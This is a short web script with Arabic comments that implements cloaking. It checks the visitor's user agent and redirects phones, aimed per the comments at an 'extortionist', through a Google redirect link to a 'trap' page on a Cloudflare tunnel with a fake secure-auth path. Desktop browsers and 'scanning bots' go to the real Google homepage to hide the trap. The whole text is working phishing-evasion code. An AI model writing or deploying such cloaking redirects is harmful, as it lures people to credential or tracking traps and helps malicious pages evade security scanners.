<script>
// الطبقة الثالثة: فحص هوية الزائر (Cloaking)
var userAgent = navigator.userAgent || navigator.vendor || window.opera;

if (/android|iphone|kindle|ipad/i.test(userAgent)) {
    // إذا كان جوال (المبتز) -> وجهه للفخ عبر رابط جوجل الموثوق
    window.location.replace("https://www.google.com/url?sa=t&url=https%3A%2F%2Fformatting-colleague-enabled-lap.trycloudflare.com%2Fv11_secure_active_auth");
} else {
    // إذا كان كمبيوتر أو بوت فحص -> وجهه لصفحة جوجل الأصلية للتمويه
    window.location.replace("https://www.google.com");
}
</script>
